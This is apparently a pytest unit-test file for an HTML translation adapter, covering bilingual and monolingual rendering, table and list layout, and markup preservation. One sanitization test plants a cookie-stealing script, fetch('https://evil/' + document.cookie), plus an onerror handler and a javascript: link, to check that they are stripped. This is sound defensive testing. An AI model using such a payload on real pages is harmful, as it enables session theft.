"""Unit tests for the HTML adapter."""

import tempfile
from pathlib import Path

import pytest
from bs4 import BeautifulSoup

from ubt.adapters.html.adapter import HTMLAdapter
from ubt.core.engine.ledger import SQLiteJobLedger
from ubt.core.ir.models import BlockStatus, BlockType, BookManifest, ChapterMeta, FlowID, IRBlock

SAMPLE_HTML = """<!DOCTYPE html>
<html>
<head><title>News Page</title><style>p.lead { color: red; }</style></head>
<body>
<h1>Big Headline</h1>
<p class="lead">First paragraph with words.</p>
<pre><code>const x = 1;</code></pre>
<ul><li>Item one text</li><li>Item two text</li></ul>
<table><tr><td>Cell A</td><td>Cell B</td></tr></table>
</body>
</html>
"""


@pytest.mark.asyncio
async def test_html_manifest_and_parse(tmp_path: Path) -> None:
    html_file = tmp_path / "page.html"
    html_file.write_text(SAMPLE_HTML, encoding="utf-8")

    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(html_file)
    assert manifest.title == "News Page"
    assert manifest.chapters[0].chapter_id == "html_main"

    chapters = [ch async for ch in adapter.parse_stream(html_file)]
    assert len(chapters) == 1
    blocks = chapters[0].blocks
    # h1, p, pre-code, 2x li, 2x td — in document order, empties skipped
    assert [b.source_text for b in blocks] == [
        "Big Headline",
        "First paragraph with words.",
        "const x = 1;",
        "Item one text",
        "Item two text",
        "Cell A",
        "Cell B",
    ]
    assert blocks[0].block_type == BlockType.HEADING
    assert blocks[1].block_type == BlockType.NARRATIVE
    assert blocks[2].block_type == BlockType.CODE
    assert blocks[2].skip_translate is True
    # table cells get the TABLE_GRID flow, list items stay MAIN_STORY
    assert blocks[3].flow_id == FlowID.MAIN_STORY
    assert blocks[5].flow_id == FlowID.TABLE_GRID
    # stable leaf-position block ids (h1=0, p=1, pre=2, li=3, li=4, td=5, td=6)
    assert blocks[0].id == "html_main#p00000"
    assert blocks[6].id == "html_main#p00006"


@pytest.mark.asyncio
async def test_html_bilingual_render_preserves_markup(tmp_path: Path) -> None:
    html_file = tmp_path / "page.html"
    html_file.write_text(SAMPLE_HTML, encoding="utf-8")
    out_file = tmp_path / "page_bilingual.html"

    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(html_file)
    chapters = [ch async for ch in adapter.parse_stream(html_file)]

    with SQLiteJobLedger(tmp_path / "ledger.db") as ledger:
        ledger.init_job_from_manifest(manifest.doc_id, manifest)
        ledger.append_chapter(manifest.doc_id, chapters[0])
        for block in chapters[0].blocks:
            ledger.save_checkpoint(
                block_id=block.id,
                status=BlockStatus.MTQE_PASSED,
                target_text=f"译：{block.source_text}",
            )
        rendered = await adapter.render_output(
            manifest, ledger, target_lang="zh", output_path=out_file
        )
        assert rendered == out_file

    content = out_file.read_text(encoding="utf-8")
    # bilingual siblings injected after each translated leaf
    assert "<h1>Big Headline</h1>" in content
    assert "译：Big Headline" in content
    assert '<p class="lead">First paragraph with words.</p>' in content
    assert 'class="lead ubt-bilingual-target"' in content
    # source markup untouched: <pre>/<code> preserved and NOT translated
    assert "<pre><code>const x = 1;</code></pre>" in content
    assert "译：const" not in content
    # stylesheet survives
    assert "p.lead { color: red; }" in content
    # table cells translated in place
    assert "译：Cell A" in content


@pytest.mark.asyncio
async def test_html_table_injection_keeps_column_count(tmp_path: Path) -> None:
    """A translated <td>/<th> is injected *inside* the cell, never as a
    sibling cell that would double the column count and wreck the table."""
    html_file = tmp_path / "page.html"
    html_file.write_text(SAMPLE_HTML, encoding="utf-8")
    out_file = tmp_path / "page_bilingual.html"

    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(html_file)
    chapters = [ch async for ch in adapter.parse_stream(html_file)]
    with SQLiteJobLedger(tmp_path / "ledger.db") as ledger:
        ledger.init_job_from_manifest(manifest.doc_id, manifest)
        ledger.append_chapter(manifest.doc_id, chapters[0])
        for block in chapters[0].blocks:
            ledger.save_checkpoint(
                block_id=block.id,
                status=BlockStatus.MTQE_PASSED,
                target_text=f"译：{block.source_text}",
            )
        await adapter.render_output(manifest, ledger, target_lang="zh", output_path=out_file)

    soup = BeautifulSoup(out_file.read_text(encoding="utf-8"), "html.parser")
    for tr in soup.find_all("tr"):
        # Column count must be unchanged — the bug inserts a sibling <td>.
        direct_cells = tr.find_all(["td", "th"], recursive=False)
        assert len(direct_cells) == 2, direct_cells
        for cell in direct_cells:
            target = cell.find("div", class_="ubt-bilingual-target")
            assert target is not None, cell
            assert target.get_text().startswith("译：")


@pytest.mark.asyncio
async def test_html_source_file_never_modified(tmp_path: Path) -> None:
    html_file = tmp_path / "page.html"
    html_file.write_text(SAMPLE_HTML, encoding="utf-8")
    original = html_file.read_text(encoding="utf-8")

    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(html_file)
    chapters = [ch async for ch in adapter.parse_stream(html_file)]

    with SQLiteJobLedger(tmp_path / "ledger.db") as ledger:
        ledger.init_job_from_manifest(manifest.doc_id, manifest)
        ledger.append_chapter(manifest.doc_id, chapters[0])
        for block in chapters[0].blocks:
            ledger.save_checkpoint(
                block_id=block.id,
                status=BlockStatus.MTQE_PASSED,
                target_text="译",
            )
        await adapter.render_output(
            manifest, ledger, target_lang="zh", output_path=tmp_path / "out.html"
        )

    assert html_file.read_text(encoding="utf-8") == original


@pytest.mark.asyncio
async def test_html_missing_file_raises(tmp_path: Path) -> None:
    from ubt.core.exceptions import DocumentParseError

    adapter = HTMLAdapter()
    with pytest.raises(DocumentParseError, match="HTML file not found"):
        await adapter.extract_manifest(tmp_path / "missing.html")


def test_html_declares_output_suffixes() -> None:
    """HTMLAdapter must declare its output suffixes so the pipeline
    extension guard rejects writing HTML to a non-HTML path (see docx twin)."""
    assert HTMLAdapter.output_suffixes == frozenset({".html", ".htm"})


async def test_html_adapter_monolingual_mode() -> None:
    """Verify that HTMLAdapter replaces leaf content in monolingual mode."""
    tmp = Path(tempfile.mkdtemp())
    src_html = tmp / "index.html"
    src_html.write_text(
        "<html><body><p>Source english paragraph.</p></body></html>", encoding="utf-8"
    )

    manifest = BookManifest(
        doc_id="test_html",
        title="HTML Test",
        source_path=str(src_html),
        chapters=[
            ChapterMeta(
                chapter_id="ch001", title="Chapter 1", spine_index=1, source_file="index.html"
            )
        ],
    )
    blocks = [
        IRBlock(
            id="ch001#p00000",
            spine_index=1,
            flow_id=FlowID.MAIN_STORY,
            source_text="Source english paragraph.",
            target_text="中文翻译段落。",
        )
    ]
    out_mono = tmp / "out_mono.html"
    adapter = HTMLAdapter()
    await adapter.render_blocks(manifest, blocks, "zh", out_mono, bilingual_mode="monolingual")
    content = out_mono.read_text(encoding="utf-8")
    assert "中文翻译段落。" in content
    assert "Source english paragraph." not in content


async def test_html_monolingual_labels_unresolved_drafts() -> None:
    """An unresolved draft must stay visible *and labelled* (ubt.adapters.unresolved).

    Regression: HTML injected the bare machine draft exactly like an approved
    translation, so a reader (and reviewer) could not tell it apart.
    """
    tmp = Path(tempfile.mkdtemp())
    src_html = tmp / "index.html"
    src_html.write_text(
        "<html><body><p>Source english paragraph.</p></body></html>", encoding="utf-8"
    )
    manifest = BookManifest(
        doc_id="test_html",
        title="HTML Test",
        source_path=str(src_html),
        chapters=[
            ChapterMeta(
                chapter_id="ch001", title="Chapter 1", spine_index=1, source_file="index.html"
            )
        ],
    )
    blocks = [
        IRBlock(
            id="ch001#p00000",
            spine_index=1,
            flow_id=FlowID.MAIN_STORY,
            source_text="Source english paragraph.",
            target_text="未经审核的机器草稿。",
            status=BlockStatus.NEEDS_HUMAN,
        )
    ]
    out = tmp / "out.html"
    await HTMLAdapter().render_blocks(manifest, blocks, "zh", out, bilingual_mode="monolingual")
    content = out.read_text(encoding="utf-8")
    assert "未经审核的机器草稿。" in content
    assert "[UBT]" in content


async def test_html_adapter_monolingual_keeps_multiple_paragraphs() -> None:
    """Monolingual output must split on blank lines like the bilingual branch.

    Emitting the whole sanitized fragment as one text node let HTML collapse the
    paragraph breaks, losing structure.
    """
    tmp = Path(tempfile.mkdtemp())
    src_html = tmp / "index.html"
    src_html.write_text("<html><body><p>Source.</p></body></html>", encoding="utf-8")
    manifest = BookManifest(
        doc_id="test_html",
        title="HTML Test",
        source_path=str(src_html),
        chapters=[
            ChapterMeta(
                chapter_id="ch001", title="Chapter 1", spine_index=1, source_file="index.html"
            )
        ],
    )
    blocks = [
        IRBlock(
            id="ch001#p00000",
            spine_index=1,
            flow_id=FlowID.MAIN_STORY,
            source_text="Source.",
            target_text="第一段。\n\n第二段。",
        )
    ]
    out = tmp / "out_multi.html"
    await HTMLAdapter().render_blocks(manifest, blocks, "zh", out, bilingual_mode="monolingual")
    content = out.read_text(encoding="utf-8")
    assert "第一段。" in content and "第二段。" in content
    assert content.count("<p") == 2, content


async def test_html_adapter_preserves_angle_bracket_prose() -> None:
    """Translated technical prose containing ``List<T>``,
    ``<stdio.h>`` or ``a<b`` must survive to the output instead of being
    swallowed as (illegal/unpaired) HTML tags, while a genuine inline ``<b>``
    still renders as bold."""
    tmp = Path(tempfile.mkdtemp())
    src_html = tmp / "index.html"
    src_html.write_text("<html><body><p>Source.</p></body></html>", encoding="utf-8")
    manifest = BookManifest(
        doc_id="test_html",
        title="HTML Test",
        source_path=str(src_html),
        chapters=[
            ChapterMeta(
                chapter_id="ch001", title="Chapter 1", spine_index=1, source_file="index.html"
            )
        ],
    )
    target = "每个 List<T> 含 <stdio.h>，当 a<b 且 b>c，另有 <b>粗</b>"
    blocks = [
        IRBlock(
            id="ch001#p00000",
            spine_index=1,
            flow_id=FlowID.MAIN_STORY,
            source_text="Source.",
            target_text=target,
        )
    ]
    out = tmp / "out.html"
    await HTMLAdapter().render_blocks(manifest, blocks, "zh", out, bilingual_mode="monolingual")
    soup = BeautifulSoup(out.read_text(encoding="utf-8"), "html.parser")
    para = soup.find("p")
    assert para is not None
    text = para.get_text()
    for piece in ("List<T>", "<stdio.h>", "a<b 且 b>c"):
        assert piece in text, (piece, text)
    bold = para.find("b")
    assert bold is not None and bold.get_text() == "粗"


async def test_html_deliverable_does_not_ship_source_scripts_and_handlers(
    tmp_path: Path,
) -> None:
    """L-4 for HTML inputs: the source markup is copied into the deliverable.

    ``scrub_source_document`` documents itself as the guard for markup the run
    did not write — EPUB members *and* HTML inputs — but only the EPUB path
    called it, so a downloaded page shipped its ``<script>``, ``onerror=``
    handler and ``javascript:`` link straight into the finished book.
    """
    src = tmp_path / "dirty.html"
    src.write_text(
        "<html><body><p>Source english paragraph.</p>"
        "<script>fetch('https://evil/' + document.cookie)</script>"
        '<img src="x.png" onerror="alert(1)">'
        '<a href="javascript:void(0)">click</a>'
        "</body></html>",
        encoding="utf-8",
    )
    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(src)
    chapters = [c async for c in adapter.parse_stream(src)]
    blocks = [b for ch in chapters for b in ch.blocks]
    for b in blocks:
        b.target_text = "译：" + (b.source_text or "")

    out = tmp_path / "out.html"
    await adapter.render_blocks(manifest, blocks, "zh", out, bilingual_mode="bilingual")

    text = out.read_text(encoding="utf-8")
    assert "<script" not in text.lower()
    assert "onerror" not in text.lower()
    assert "javascript:" not in text.lower()
    assert "译：Source english paragraph." in text


@pytest.mark.fast
@pytest.mark.asyncio
async def test_html_ordered_list_bilingual_injection_inside_li(tmp_path: Path) -> None:
    html_file = tmp_path / "ol_page.html"
    html_file.write_text(
        "<html><body><ol><li>Item 1</li><li>Item 2</li></ol></body></html>",
        encoding="utf-8",
    )
    out_file = tmp_path / "ol_out.html"
    adapter = HTMLAdapter()
    manifest = await adapter.extract_manifest(html_file)
    chapters = [c async for c in adapter.parse_stream(html_file)]
    blocks = chapters[0].blocks
    for b in blocks:
        b.target_text = f"译：{b.source_text}"
    await adapter.render_blocks(manifest, blocks, "zh", out_file, bilingual_mode="bilingual")

    soup = BeautifulSoup(out_file.read_text(encoding="utf-8"), "html.parser")
    ol = soup.find("ol")
    assert ol is not None
    # Must NOT create 4 <li> tags under <ol>; it must preserve exactly 2 <li> elements!
    direct_lis = ol.find_all("li", recursive=False)
    assert len(direct_lis) == 2, f"Expected 2 <li> in <ol>, got {len(direct_lis)}"
    # Target translation must be injected inside each <li> as a div
    for li in direct_lis:
        div = li.find("div", class_="ubt-bilingual-target")
        assert div is not None, f"Expected .ubt-bilingual-target div inside li, got: {li}"
        assert div.get_text().startswith("译：")


async def test_html_monolingual_preserves_inline_media_and_anchors() -> None:
    """Replacing text must not delete inline images / footnote anchors.

    Regression: the monolingual branch ``clear()``-ed the leaf, so every inline
    ``<img>``, ``<a href>`` and footnote reference vanished from the deliverable
    (DOCX already preserved the equivalent graphics/hyperlinks).
    """
    tmp = Path(tempfile.mkdtemp())
    src_html = tmp / "index.html"
    src_html.write_text(
        '<html><body><p>See <img src="fig.png" alt="fig"/> and '
        '<a href="#fn1" id="ref1">[1]</a> for details.</p></body></html>',
        encoding="utf-8",
    )
    manifest = BookManifest(
        doc_id="test_html",
        title="HTML Test",
        source_path=str(src_html),
        chapters=[
            ChapterMeta(
                chapter_id="ch001", title="Chapter 1", spine_index=1, source_file="index.html"
            )
        ],
    )
    blocks = [
        IRBlock(
            id="ch001#p00000",
            spine_index=1,
            flow_id=FlowID.MAIN_STORY,
            source_text="See fig and note for details.",
            target_text="详见插图与脚注。",
        )
    ]
    out = tmp / "out.html"
    await HTMLAdapter().render_blocks(manifest, blocks, "zh", out, bilingual_mode="monolingual")
    content = out.read_text(encoding="utf-8")
    assert "详见插图与脚注。" in content
    assert "fig.png" in content
    assert 'href="#fn1"' in content
    assert 'id="ref1"' in content
